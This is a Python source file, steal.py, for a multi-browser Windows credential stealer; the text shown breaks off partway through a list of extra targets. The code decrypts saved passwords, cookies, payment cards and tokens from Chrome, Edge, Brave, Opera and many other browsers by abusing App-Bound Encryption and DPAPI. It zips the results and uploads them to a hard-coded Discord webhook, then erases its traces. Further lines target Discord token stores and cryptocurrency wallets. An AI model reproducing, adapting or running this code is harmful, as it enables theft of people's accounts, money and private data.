#!/usr/bin/env python3
# steal.py - multi-browser edition (Silent Drop)
# ABE  (COM staging):  Chrome, Chrome Beta, Chrome Dev, Chrome Canary,
#                      Brave, Edge, Avast
# DPAPI (no staging):  Opera, Opera GX, Vivaldi, Yandex, Whale, CocCoc,
#                      Torch, Epic, Comodo Dragon, Slimjet, Iron, UC Browser,
#                      QQ Browser, 360 Chrome, Chromium

import base64, ctypes, ctypes.wintypes, hashlib, io, json, os, random
import shutil, sqlite3, subprocess, sys, tempfile, time, winreg, zipfile
import urllib.error, urllib.request

# ── webhook ────────────────────────────────────────────────────────────────────
HOOK_ID    = "1569157971798134814"
HOOK_TOKEN = "d9G49MngMFEov3eg-FFOBh5S8WgIGL-e2oTlNPn0Nkyao0_CgsUJa4jucxJekVgXDK5Y"
_WEB       = "https://" + "disc" + "ord" + ".com" + "/api/" + "webh" + "ooks/"
PASSPHRASE = "change-me-2026"

KEYFILE     = os.path.join(tempfile.gettempdir(), "abk.bin")
LOG         = os.path.join(tempfile.gettempdir(), "abh.log")
STAGE_NAME  = "chrome_python.exe"   # same name regardless of browser — looks legit
SELF_DELETE = False
CHUNK       = 1850
UA          = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
               "AppleWebKit/537.36 Chrome/156.0.0.0 Safari/537.36")

CREDENTIAL_FILES = [
    ("Login Data",              "a.bin"),
    ("Login Data For Account",  "b.bin"),
    ("Web Data",                "c.bin"),
    ("Network\\Cookies",        "d.bin"),
]

# ── browser configs ────────────────────────────────────────────────────────────
_LA = os.environ.get("LOCALAPPDATA",  "")
_PF = os.environ.get("PROGRAMFILES",  r"C:\Program Files")
_P86= os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")

BROWSERS = {
    "chrome": {
        "name":        "Chrome",
        "exe":         "chrome.exe",
        "stage_name":  "chrome_python.exe",
        "clsid":       "{708860E0-F641-4611-8895-7D867DD3675B}",
        "iids":        [
            "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",  # v2
            "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}",
            "{463ABECF-410D-407F-8AF5-0DF35A005CC8}",  # v1
        ],
        "slot":        5,
        "default_dir": os.path.join(_PF, "Google", "Chrome", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome\shell\open\command",
        "aster":       False,
    },
    "chrome-beta": {
        "name":        "Chrome Beta",
        "exe":         "chrome.exe",
        "stage_name":  "chromebeta_python.exe",
        "clsid":       "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",
        "iids":        [
            "{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",  # v2
            "{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}",  # v1
        ],
        "slot":        5,
        "default_dir": os.path.join(_PF, "Google", "Chrome Beta", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome Beta", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome Beta",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome Beta\shell\open\command",
        "aster":       False,
    },
    "brave": {
        "name":        "Brave",
        "exe":         "brave.exe",
        "stage_name":  "brave_python.exe",
        "clsid":       "{576B31AF-6369-4B6B-8560-E4B203A97A8B}",
        "iids":        [
            "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",  # reuses Chrome v2 IID
            "{F396861E-0C8E-4C71-8256-2FAE6D759CE9}",  # v1
        ],
        "slot":        5,
        "default_dir": os.path.join(_PF, "BraveSoftware", "Brave-Browser", "Application"),
        "user_data":   os.path.join(_LA, "BraveSoftware", "Brave-Browser", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\BraveSoftware Brave-Browser",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Brave\shell\open\command",
        "aster":       False,
    },
    "edge": {
        "name":        "Edge",
        "exe":         "msedge.exe",
        "stage_name":  "msedge_python.exe",
        "clsid":       "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
        "iids":        [
            "{8F7B6792-784D-4047-845D-1782EFBEF205}",  # v2
            "{C9C2B807-7731-4F34-81B7-44FF7779522B}",  # v1
        ],
        "slot":        8,   # IEdgeElevatorFinal: +3 EdgeBase methods before RunRecovery
        "default_dir": os.path.join(_P86, "Microsoft", "Edge", "Application"),
        "user_data":   os.path.join(_LA,  "Microsoft", "Edge", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Microsoft Edge\shell\open\command",
        "aster":       True,    # has aster_app_bound_encrypted_key (Copilot key)
        "iid_aster":   "{C9C2B807-7731-4F34-81B7-44FF7779522B}",  # v1 IID only for aster
    },
    "avast": {
        "name":        "Avast",
        "exe":         "AvastBrowser.exe",
        "stage_name":  "avast_python.exe",
        "clsid":       "{EAD34EE8-8D08-4CA1-ADA3-64754374D811}",
        "iids":        [
            "{7737BB9F-BAC1-4C71-A696-7C82D7994B6F}",  # only IID — no v2
        ],
        "slot":        13,  # IAvastElevator: 9 extra methods before EncryptData
        "default_dir": os.path.join(_PF, "AVAST Software", "Browser", "Application"),
        "user_data":   os.path.join(_LA, "AVAST Software", "Browser", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Avast Secure Browser",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Avast Secure Browser\shell\open\command",
        "aster":       False,
    },
    "chrome-dev": {
        "name":        "Chrome Dev",
        "exe":         "chrome.exe",
        "stage_name":  "chromedev_python.exe",
        "clsid":       "{DA7FDCA5-2CAA-4637-AA17-0740584DE7DA}",
        "iids":        [
            "{BB9B6D2A-F09B-4E39-B1E4-7DE50808BD40}",  # v2
            "{FD31399A-9BDB-4301-BC49-E4FC5D8A688A}",  # v1
        ],
        "slot":        5,
        "default_dir": os.path.join(_PF, "Google", "Chrome Dev", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome Dev", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome Dev",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome Dev\shell\open\command",
        "aster":       False,
    },
    "chrome-canary": {
        "name":        "Chrome Canary",
        "exe":         "chrome.exe",
        "stage_name":  "chromecanary_python.exe",
        "clsid":       "{4F476546-B412-4579-B64C-123D33F5987B}",
        "iids":        [
            "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",  # shares stable v2 IID
            "{E6B0B70A-5D32-4E06-AC9E-2B7E0AAA7D93}",  # v1
        ],
        "slot":        5,
        "default_dir": os.path.join(_LA, "Google", "Chrome SxS", "Application"),
        "user_data":   os.path.join(_LA, "Google", "Chrome SxS", "User Data"),
        "uninstall":   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome SxS",
        "sm_key":      r"SOFTWARE\Clients\StartMenuInternet\Google Chrome Canary\shell\open\command",
        "aster":       False,
    },
}

_AD = os.environ.get("APPDATA", "")

BROWSERS_LEGACY = {
    "opera": {
        "name":      "Opera",
        "exe":       "opera.exe",
        "user_data": os.path.join(_AD, "Opera Software", "Opera Stable"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\OperaStable\shell\open\command",
    },
    "opera-gx": {
        "name":      "Opera GX",
        "exe":       "opera.exe",
        "user_data": os.path.join(_AD, "Opera Software", "Opera GX Stable"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera GX",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\Opera GX Stable\shell\open\command",
    },
    "vivaldi": {
        "name":      "Vivaldi",
        "exe":       "vivaldi.exe",
        "user_data": os.path.join(_LA, "Vivaldi", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Vivaldi",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\Vivaldi\shell\open\command",
    },
    "yandex": {
        "name":      "Yandex Browser",
        "exe":       "browser.exe",
        "user_data": os.path.join(_LA, "Yandex", "YandexBrowser", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Yandex",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\Yandex\shell\open\command",
    },
    "whale": {
        "name":      "Naver Whale",
        "exe":       "whale.exe",
        "user_data": os.path.join(_LA, "Naver", "Naver Whale", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Naver Whale",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\Whale\shell\open\command",
    },
    "coccoc": {
        "name":      "CocCoc",
        "exe":       "browser.exe",
        "user_data": os.path.join(_LA, "CocCoc", "Browser", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\CocCoc",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\CocCoc\shell\open\command",
    },
    "torch": {
        "name":      "Torch",
        "exe":       "torch.exe",
        "user_data": os.path.join(_LA, "Torch", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Torch",
        "sm_key":    r"",
    },
    "epic": {
        "name":      "Epic Privacy Browser",
        "exe":       "epic.exe",
        "user_data": os.path.join(_LA, "Epic Privacy Browser", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Epic Privacy Browser",
        "sm_key":    r"",
    },
    "comodo": {
        "name":      "Comodo Dragon",
        "exe":       "dragon.exe",
        "user_data": os.path.join(_LA, "Comodo", "Dragon", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Comodo Dragon",
        "sm_key":    r"",
    },
    "slimjet": {
        "name":      "Slimjet",
        "exe":       "slimjet.exe",
        "user_data": os.path.join(_LA, "Slimjet", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Slimjet",
        "sm_key":    r"",
    },
    "iron": {
        "name":      "SRWare Iron",
        "exe":       "iron.exe",
        "user_data": os.path.join(_LA, "Chromium", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Iron",
        "sm_key":    r"",
    },
    "ucbrowser": {
        "name":      "UC Browser",
        "exe":       "UCBrowser.exe",
        "user_data": os.path.join(_LA, "UCBrowser", "User Data_i18n"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\UCBrowser",
        "sm_key":    r"",
    },
    "qqbrowser": {
        "name":      "QQ Browser",
        "exe":       "QQBrowser.exe",
        "user_data": os.path.join(_LA, "Tencent", "QQBrowser", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\QQBrowser",
        "sm_key":    r"",
    },
    "360chrome": {
        "name":      "360 Chrome",
        "exe":       "360chrome.exe",
        "user_data": os.path.join(_LA, "360Chrome", "Chrome", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\360Chrome",
        "sm_key":    r"",
    },
    "chromium": {
        "name":      "Chromium",
        "exe":       "chrome.exe",
        "user_data": os.path.join(_LA, "Chromium", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Chromium",
        "sm_key":    r"SOFTWARE\Clients\StartMenuInternet\Chromium\shell\open\command",
    },
    "cent": {
        "name":      "Cent Browser",
        "exe":       "chrome.exe",
        "user_data": os.path.join(_LA, "CentBrowser", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\CentBrowser",
        "sm_key":    r"",
    },
    "iridium": {
        "name":      "Iridium Browser",
        "exe":       "iridium.exe",
        "user_data": os.path.join(_LA, "Iridium", "User Data"),
        "uninstall": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Iridium",
        "sm_key":    r"",
    },
}

# ── win32 setup ────────────────────────────────────────────────────────────────
shell32 = ctypes.WinDLL("shell32", use_last_error=True)
user32  = ctypes.WinDLL("user32",  use_last_error=True)
k32     = ctypes.WinDLL("kernel32",use_last_error=True)
ole32   = ctypes.WinDLL("ole32",   use_last_error=True)
oleaut32= ctypes.WinDLL("oleaut32",use_last_error=True)
crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
WM_CLOSE = 0x0010


class GUID(ctypes.Structure):
    _fields_ = [("a",ctypes.c_ulong),("b",ctypes.c_ushort),("c",ctypes.c_ushort),
                ("d",ctypes.c_ubyte*8)]

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData",ctypes.c_ulong),("pbData",ctypes.POINTER(ctypes.c_char))]

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize",ctypes.c_ulong),("cntUsage",ctypes.c_ulong),
                ("th32ProcessID",ctypes.c_ulong),("th32DefaultHeapID",ctypes.c_void_p),
                ("th32ModuleID",ctypes.c_ulong),("cntThreads",ctypes.c_ulong),
                ("th32ParentProcessID",ctypes.c_ulong),("pcPriClassBase",ctypes.c_long),
                ("dwFlags",ctypes.c_ulong),("szExeFile",ctypes.c_char*260)]

ole32.CLSIDFromString.argtypes      = [ctypes.c_wchar_p, ctypes.POINTER(GUID)]
ole32.CoCreateInstance.argtypes     = [ctypes.POINTER(GUID),ctypes.c_void_p,ctypes.c_ulong,
                                       ctypes.POINTER(GUID),ctypes.POINTER(ctypes.c_void_p)]
ole32.CoSetProxyBlanket.argtypes    = [ctypes.c_void_p,ctypes.c_ulong,ctypes.c_ulong,
                                       ctypes.c_void_p,ctypes.c_ulong,ctypes.c_ulong,
                                       ctypes.c_void_p,ctypes.c_ulong]
oleaut32.SysAllocStringByteLen.argtypes = [ctypes.c_char_p, ctypes.c_uint]
oleaut32.SysAllocStringByteLen.restype  = ctypes.c_void_p
oleaut32.SysStringByteLen.argtypes  = [ctypes.c_void_p]
oleaut32.SysStringByteLen.restype   = ctypes.c_uint
oleaut32.SysFreeString.argtypes     = [ctypes.c_void_p]
oleaut32.SysFreeString.restype      = None
crypt32.CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB),ctypes.c_void_p,
                                       ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p,
                                       ctypes.c_ulong,ctypes.POINTER(DATA_BLOB)]
crypt32.CryptUnprotectData.restype  = ctypes.c_int


def log(m):
    # TOTAL SILENCE
    pass


def admin():
    return bool(shell32.IsUserAnAdmin())


def pids(name):
    snap = k32.CreateToolhelp32Snapshot(2, 0)
    if snap == -1: return []
    e = PROCESSENTRY32(); e.dwSize = ctypes.sizeof(PROCESSENTRY32)
    out, ok = [], k32.Process32First(snap, ctypes.byref(e))
    while ok:
        if e.szExeFile.decode("mbcs","ignore").lower() == name.lower():
            out.append(e.th32ProcessID)
        ok = k32.Process32Next(snap, ctypes.byref(e))
    k32.CloseHandle(snap)
    return out


def close_browser(exe_name, timeout=25):
    targets = set(pids(exe_name))
    if not targets: return True
    CALLBACK = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, _):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if pid.value in targets:
            user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        return 1
    user32.EnumWindows(CALLBACK(cb), 0)
    end = time.time() + timeout
    while time.time() < end:
        if not pids(exe_name): return True
        time.sleep(0.5)
    subprocess.run(["taskkill","/F","/IM",exe_name], capture_output=True, creationflags=0x08000000)
    time.sleep(2)
    return not pids(exe_name)


def guid(s):
    g = GUID()
    if ole32.CLSIDFromString(ctypes.c_wchar_p(s), ctypes.byref(g)) != 0:
        raise OSError("bad guid: %s" % s)
    return g


def blanket(p):
    ole32.CoSetProxyBlanket(p, 0xFFFFFFFF, 0xFFFFFFFF, None, 6, 3, None, 0x40)


def _decrypt_with_iid(p_val, iid_str, raw_key, slot):
    iid  = guid(iid_str)
    p2   = ctypes.c_void_p()
    vt   = ctypes.cast(p_val, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
    bstr = oleaut32.SysAllocStringByteLen(raw_key, len(raw_key))
    out  = ctypes.c_void_p()
    last = ctypes.c_ulong(0)
    fn   = ctypes.WINFUNCTYPE(
        ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_void_p),
        ctypes.POINTER(ctypes.c_ulong))(vt[slot])
    hr   = fn(p_val, bstr, ctypes.byref(out), ctypes.byref(last))
    oleaut32.SysFreeString(bstr)
    if hr < 0 or not out.value:
        return None
    key = ctypes.string_at(out.value, oleaut32.SysStringByteLen(out))
    oleaut32.SysFreeString(out)
    return key


def com_key(cfg, key_name="app_bound_encrypted_key"):
    ole32.CoInitializeEx(None, 2)
    clsid = guid(cfg["clsid"])
    ud    = cfg["user_data"]

    try:
        ls   = json.loads(open(os.path.join(ud,"Local State"),"rb").read())
        b64  = ls["os_crypt"].get("app_bound_encrypted_key") or ls.get("app_bound_encrypted_key")
        if not b64:
            return None
        raw  = base64.b64decode(b64)[4:]
    except Exception:
        return None

    p = ctypes.c_void_p()
    connected_iid = None
    for iid_str in cfg["iids"]:
        p = ctypes.c_void_p()
        iid = guid(iid_str)
        if ole32.CoCreateInstance(ctypes.byref(clsid), None, 4,
                                  ctypes.byref(iid), ctypes.byref(p)) == 0:
            connected_iid = iid_str
            break
    if not connected_iid or not p.value:
        return None

    blanket(p)
    result = _decrypt_with_iid(p.value, connected_iid, raw, cfg["slot"])

    vt = ctypes.cast(p.value, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
    ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(vt[2])(p)
    return result


def com_key_aster(cfg):
    ole32.CoInitializeEx(None, 2)
    ud    = cfg["user_data"]
    try:
        ls  = json.loads(open(os.path.join(ud,"Local State"),"rb").read())
        b64 = ls.get("aster_app_bound_encrypted_key")
        if not b64: return None
        raw = base64.b64decode(b64)[4:]
    except: return None

    clsid = guid(cfg["clsid"])
    iid   = guid(cfg["iid_aster"])
    p     = ctypes.c_void_p()
    if ole32.CoCreateInstance(ctypes.byref(clsid), None, 4,
                              ctypes.byref(iid), ctypes.byref(p)) != 0:
        return None
    if not p.value: return None
    blanket(p)
    result = _decrypt_with_iid(p.value, cfg["iid_aster"], raw, cfg["slot"])
    vt = ctypes.cast(p.value, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
    ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(vt[2])(p)
    return result


def dpapi(blob, entropy=None):
    buf = ctypes.create_string_buffer(blob, len(blob))
    din = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    dout = DATA_BLOB()
    p_ent = None
    if entropy:
        ebuf = ctypes.create_string_buffer(entropy, len(entropy))
        ent  = DATA_BLOB(len(entropy), ctypes.cast(ebuf, ctypes.POINTER(ctypes.c_char)))
        p_ent = ctypes.byref(ent)
    if not crypt32.CryptUnprotectData(ctypes.byref(din), None, p_ent, None, None, 0,
                                      ctypes.byref(dout)):
        return None
    try:    return ctypes.string_at(dout.pbData, dout.cbData)
    finally: k32.LocalFree(dout.pbData)


def legacy_key(cfg):
    try:
        ls  = json.loads(open(os.path.join(cfg["user_data"],"Local State"),"rb").read())
        raw = base64.b64decode(ls["os_crypt"]["encrypted_key"])
        return dpapi(raw[5:] if raw[:5] == b"DPAPI" else raw)
    except: return None


def aes():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    return AESGCM


def dec(blob, abe, lk, tags):
    if not isinstance(blob,(bytes,bytearray)) or len(blob) < 20:
        return None
    pre, nonce, ct = blob[:3], blob[3:15], blob[15:]
    key = abe if pre == b"v20" else lk if pre == b"v10" else None
    if key is None: return None
    try:
        pt = aes()(key).decrypt(nonce, ct, None)
    except: return None
    if pre == b"v20" and len(pt) >= 32:
        head = pt[:32]
        for t in list(tags)+[""]:
            if head == hashlib.sha256(t.encode()).digest():
                return pt[32:]
        if sum(32 <= c < 127 for c in head) < 8:
            return pt[32:]
    return pt


def stash(pdir, dest):
    os.makedirs(dest, exist_ok=True)
    mapping = {}
    for real, alias in CREDENTIAL_FILES:
        src = os.path.join(pdir, *real.split("\\"))
        if not os.path.isfile(src): continue
        st = os.path.join(dest,"_s"); os.makedirs(st, exist_ok=True)
        subprocess.run(["robocopy", os.path.dirname(src), st, os.path.basename(src),
                        "/NJH","/NJS","/NDL","/NFL","/NC","/NS","/NP",
                        "/R:1","/W:1"], capture_output=True, creationflags=0x08000000)
        got = os.path.join(st, os.path.basename(src))
        if os.path.isfile(got):
            os.replace(got, os.path.join(dest, alias))
            mapping[alias] = real
            shutil.rmtree(st, ignore_errors=True)
        time.sleep(0.25)
    return mapping


def sweep(path, abe, lk, label, out):
    tmp = os.path.join(tempfile.gettempdir(), "q%d.db" % os.getpid())
    shutil.copy2(path, tmp)
    try:
        con = sqlite3.connect(tmp)
        try:
            tables = [r[0] for r in con.execute(
                "select name from sqlite_master where type='table'").fetchall()]
        except sqlite3.DatabaseError:
            con.close(); return 0
        n = 0
        for table in tables:
            try:
                cols = [c[1] for c in con.execute("pragma table_info(%s)" % table)]
                rows = con.execute("select * from %s" % table).fetchall()
            except sqlite3.Error: continue
            for row in rows:
                tags = []
                for k in ("host_key","origin_url","url","signon_realm"):
                    if k in cols:
                        v = row[cols.index(k)]
                        if isinstance(v,str) and v:
                            tags += [v, v.replace("https://","").replace("http://","").split("/")[0]]
                ctx = {cols[i]:str(v) for i,v in enumerate(row)
                       if isinstance(v,(str,int)) and not isinstance(v,bool) and str(v)}
                for i, v in enumerate(row):
                    if isinstance(v,(bytes,bytearray)) and v[:3] in (b"v20",b"v10"):
                        pt = dec(bytes(v), abe, lk, tags)
                        if not pt: continue
                        try:   text = pt.decode("utf-8")
                        except: continue
                        if len(text)<4 or sum(32<=ord(c)<127 for c in text)/len(text)<0.85:
                            continue
                        out.append({"db":label,"table":table,"column":cols[i],
                                    "value":text,"context":ctx})
                        n += 1
        con.close(); return n
    finally:
        try: os.remove(tmp)
        except: pass


def harvest(cfg, abe, lk):
    records = []
    ud = cfg["user_data"]
    if not os.path.isdir(ud): return records
    for prof in sorted(os.listdir(ud)):
        pdir = os.path.join(ud, prof)
        if not os.path.isdir(pdir): continue
        dest = os.path.join(tempfile.gettempdir(),
                            "h%d_%s_%s" % (os.getpid(), cfg["name"].replace(" ",""), prof))
        shutil.rmtree(dest, ignore_errors=True)
        for alias, real in stash(pdir, dest).items():
            n = sweep(os.path.join(dest,alias), abe, lk,
                      "%s/%s/%s" % (cfg["name"],prof,real), records)
        shutil.rmtree(dest, ignore_errors=True)
    return records


def write_report(records, outdir):
    os.makedirs(outdir, exist_ok=True)
    pw = [r for r in records if r["table"]=="logins"]
    ck = [r for r in records if r["table"]=="cookies"]
    cd = [r for r in records if "card" in r["table"].lower()]
    tk = [r for r in records if r["table"]=="token_service"]
    with open(os.path.join(outdir,"passwords.tsv"),"w",encoding="utf-8") as f:
        for r in pw:
            f.write("%s\t%s\t%s\n" % (r["context"].get("origin_url",""),
                                       r["context"].get("username_value",""),r["value"]))
    with open(os.path.join(outdir,"cookies.txt"),"w",encoding="utf-8") as f:
        f.write("# Netscape HTTP Cookie File\n")
        for r in ck:
            c = r["context"]
            f.write("\t".join([c.get("host_key",""),"TRUE",c.get("path","/"),
                               "TRUE","0",c.get("name",""),r["value"]])+"\n")
    with open(os.path.join(outdir,"cards.tsv"),"w",encoding="utf-8") as f:
        for r in cd:
            f.write("%s\t%s\n" % (r["context"].get("name_on_card",""),r["value"]))
    with open(os.path.join(outdir,"tokens.tsv"),"w",encoding="utf-8") as f:
        for r in tk:
            f.write("%s\t%s\t%s\n" % (r["context"].get("service",""),
                                       r["context"].get("account_id",""),r["value"]))
    by_site = {}
    for r in pw:
        by_site.setdefault(r["context"].get("origin_url","(no origin)"),[]).append(
            (r["context"].get("username_value",""),r["value"]))
    with open(os.path.join(outdir,"report.txt"),"w",encoding="utf-8") as f:
        f.write("PASSWORDS (%d)\n" % len(pw))
        for site in sorted(by_site):
            f.write("\n  %s\n" % site)
            for u,p in by_site[site]:
                f.write("    user: %s\n    pass: %s\n" % (u or "(none)",p))
        f.write("\n\nCARDS (%d)\n" % len(cd))
        for r in cd: f.write("  %s\n" % r["value"])
        f.write("\n\nTOKENS (%d)\n" % len(tk))
        for r in tk:
            f.write("  %s %s %s\n" % (r["context"].get("service",""),
                                       r["context"].get("account_id",""),r["value"][:60]))
        f.write("\n\nCOOKIES (%d)\n" % len(ck))


def pack(paths):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as z:
        for p in paths:
            if os.path.isfile(p):
                z.write(p, os.path.basename(p))
            elif os.path.isdir(p):
                for root,_d,files in os.walk(p):
                    for fn in files:
                        full = os.path.join(root,fn)
                        z.write(full, os.path.relpath(full, os.path.dirname(p)))
    return buf.getvalue()


def hook():
    if not HOOK_ID or not HOOK_TOKEN: return None
    return _WEB + HOOK_ID + "/" + HOOK_TOKEN


def exfil(payload, label="report"):
    url = hook()
    if not url:
        return 0,0
    MAX = 24 * 1024 * 1024
    chunks = [payload[i:i+MAX] for i in range(0, len(payload), MAX)]
    sent = 0
    for idx, chunk in enumerate(chunks):
        fname = "%s%s.zip" % (label, ("_p%d"%(idx+1)) if len(chunks)>1 else "")
        boundary = "----" + "".join(random.choice(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            for _ in range(24))
        body = io.BytesIO()
        body.write(("--%s\r\n" % boundary).encode())
        body.write(('Content-Disposition: form-data; name="files[0]"; '
                    'filename="%s"\r\n' % fname).encode())
        body.write(b"Content-Type: application/zip\r\n\r\n")
        body.write(chunk)
        body.write(("\r\n--%s--\r\n" % boundary).encode())
        data = body.getvalue()
        for attempt in range(4):
            req = urllib.request.Request(url, data=data, headers={
                "Content-Type":"multipart/form-data; boundary=%s" % boundary,
                "User-Agent": UA})
            try:
                with urllib.request.urlopen(req, timeout=90) as r:
                    if r.status in (200,204):
                        sent += 1; break
            except urllib.error.HTTPError as e:
                if e.code == 429: time.sleep(3+random.uniform(0,2)); continue
            except Exception:
                pass
            time.sleep(2+attempt)
    return sent, len(chunks)


def cleanup(report_dirs):
    import re
    victims = [LOG] + report_dirs
    t = tempfile.gettempdir()
    pat = re.compile(r"^(h\d+_|q\d+\.db$)")
    try:
        for name in os.listdir(t):
            if pat.match(name): victims.append(os.path.join(t,name))
    except: pass
    gone = 0
    for v in victims:
        try:
            if os.path.isdir(v):  shutil.rmtree(v,ignore_errors=True); gone+=1
            elif os.path.isfile(v): os.remove(v); gone+=1
        except: pass
    home = os.path.dirname(os.path.abspath(__file__))
    try:
        pc = os.path.join(home,"__pycache__")
        for f in os.listdir(pc):
            if f.startswith("steal."): os.remove(os.path.join(pc,f)); gone+=1
    except: pass
    if SELF_DELETE:
        try:
            subprocess.Popen(
                ["cmd","/c","ping -n 3 127.0.0.1 >nul & del /f /q \"%s\""
                 % os.path.abspath(__file__)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
        except: pass


def find_install_dir(cfg):
    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        try:
            with winreg.OpenKey(hive, cfg["uninstall"], 0,
                                winreg.KEY_READ|winreg.KEY_WOW64_64KEY) as k:
                loc = winreg.QueryValueEx(k,"InstallLocation")[0]
                if os.path.isdir(loc): return loc
        except: pass
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, cfg["sm_key"], 0,
                            winreg.KEY_READ|winreg.KEY_WOW64_64KEY) as k:
            cmd = winreg.QueryValueEx(k,"")[0].strip('"').split('"')[0]
            d   = os.path.dirname(cmd)
            if os.path.isdir(d): return d
    except: pass
    if os.path.isdir(cfg["default_dir"]): return cfg["default_dir"]
    return None


def stage(cfg, install_dir):
    staged = os.path.join(install_dir, cfg["stage_name"])
    dll    = os.path.join(os.path.dirname(sys.executable),
                          "python%d%d.dll" % sys.version_info[:2])
    shutil.copy2(sys.executable, staged)
    out = [staged]
    if os.path.isfile(dll):
        dst = os.path.join(install_dir, os.path.basename(dll))
        shutil.copy2(dll, dst)
        out.append(dst)
    return out


def unstage(cfg, install_dir):
    for name in [cfg["stage_name"],
                 "python%d%d.dll" % sys.version_info[:2]]:
        try: os.remove(os.path.join(install_dir, name))
        except: pass


def elevate(action):
    return shell32.ShellExecuteW(None,"runas",sys.executable,
                                 '"%s" %s' % (os.path.abspath(__file__),action),None,0)


def wait_for(path, present=True, timeout=90):
    end = time.time() + timeout
    while time.time() < end:
        if os.path.exists(path) == present: return True
        time.sleep(0.4)
    return False


def extra_sources():
    ad = os.environ.get("APPDATA","")
    ld = os.environ.get("LOCALAPPDATA","")
    out = [
        ("discord",       os.path.join(ad,"discord","Local Storage","leveldb")),
        ("discordcanary", os.path.join(ad,"discordcanary","Local Storage","leveldb")),
        ("discordptb",    os.path.join(ad,"discordptb","Local Storage","leveldb")),
        ("exodus",        os.path.join(ad,"Exodus","exodus.wallet")),
        ("electrum",      os.path.join(ad,"Electrum","wallets")),
        ("ethereum",      os.path.join(ad,"Ethereum","keystore")),
